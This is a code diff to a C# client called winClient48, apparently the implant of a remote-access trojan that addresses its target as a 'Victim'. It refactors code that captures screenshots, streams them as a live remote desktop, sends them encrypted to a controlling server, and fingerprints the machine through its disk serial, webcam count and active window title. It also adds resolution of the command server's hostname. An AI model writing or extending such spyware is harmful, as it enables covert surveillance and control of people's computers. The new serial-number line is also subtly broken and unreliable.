@@ -1326,7 +1326,7 @@ namespace winClient48
                         }
                         else
                         {
-                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + ScreenShot(v, device_name, width, height) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
+                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                         }
                     }
                     else if (cmd[1] == "stop")
@@ -2182,6 +2182,35 @@ namespace winClient48
             }
             return string.Join(",", result.ToArray());
         }
+        private DataTable fnWmiQuery(string szQuery)
+        {
+            DataTable dt = new DataTable();
+            using (var search = new ManagementObjectSearcher(szQuery))
+            {
+                using (var coll = search.Get())
+                {
+                    bool bCollAdded = false;
+                    foreach (ManagementObject obj in coll)
+                    {
+                        if (!bCollAdded)
+                        {
+                            foreach (PropertyData prop in obj.Properties)
+                                dt.Columns.Add(prop.Name.ToString());
+
+                            bCollAdded = true;
+                        }
+
+                        DataRow dr = dt.NewRow();
+                        foreach (PropertyData prop in obj.Properties)
+                            dr[prop.Name] = prop.Value ?? DBNull.Value;
+
+                        dt.Rows.Add(dr);
+                    }
+                }
+            }
+
+            return dt;
+        }
         /// <summary>
         /// 
         /// </summary>
@@ -2220,16 +2249,15 @@ namespace winClient48
         /// <param name="width"></param>
         /// <param name="height"></param>
         /// <returns></returns>
-        string ScreenShot(Victim v, string device_name, int width, int height)
+        Bitmap fnScreenShot(Victim v, string device_name, int width, int height)
         {
             int idx = FindDesktopIndex(device_name);
             Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
             Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
             Graphics capture_graphics = Graphics.FromImage(bitmap);
             capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
-            string b64_image = Global.BitmapToBase64(bitmap);
-
-            return b64_image;
+            
+            return bitmap;
         }
         /// <summary>
         /// Start remote desktop live.
@@ -2242,7 +2270,8 @@ namespace winClient48
         {
             while (is_connected && send_screenshot)
             {
-                string b64_img = ScreenShot(v, device_name, width, height);
+                Bitmap bmp = fnScreenShot(v, device_name, width, height);
+                string b64_img = Global.BitmapToBase64(bmp);
                 v.encSend(2, 0, "desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                 Thread.Sleep(m_nDesktopDelay);
             }
@@ -2308,7 +2337,7 @@ namespace winClient48
                         Screen.AllScreens.Length.ToString(), //MONITOR
                         new Webcam().GetDevices().Count.ToString(), //WEBCAM
                         Crypto.b64E2Str(Global.GetActiveWindowTitle()),
-                        send_screen ? ScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height) : string.Empty,
+                        send_screen ? Global.BitmapToBase64(fnScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height)) : string.Empty,
                     };
 
                     string info = string.Join("|", info_array);
@@ -2350,6 +2379,20 @@ namespace winClient48
         {
             try
             {
+                if (!IPAddress.TryParse(ip, out var address))
+                {
+                    try
+                    {
+                        IPAddress[] aAddr = Dns.GetHostAddresses(ip);
+                        if (aAddr.Length > 0)
+                            ip = aAddr[0].ToString();
+                    }
+                    catch
+                    {
+
+                    }
+                }
+
                 Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 socket.Connect(ip, port);
                 Victim v = new Victim(socket);
@@ -2377,8 +2420,12 @@ namespace winClient48
 
                 installer.Start();
 
+                /*
                 string[] id_array = Global.WMI_QueryNoEncode("select serialnumber from win32_diskdrive");
                 string szSerialNumber = id_array[0].Replace(" ", string.Empty).Trim();
+                */
+                DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
+                string szSerialNumber = dt.Rows[0].ToString().Replace(" ", string.Empty).Trim();
 
                 clntConfig = new ClientConfig()
                 {
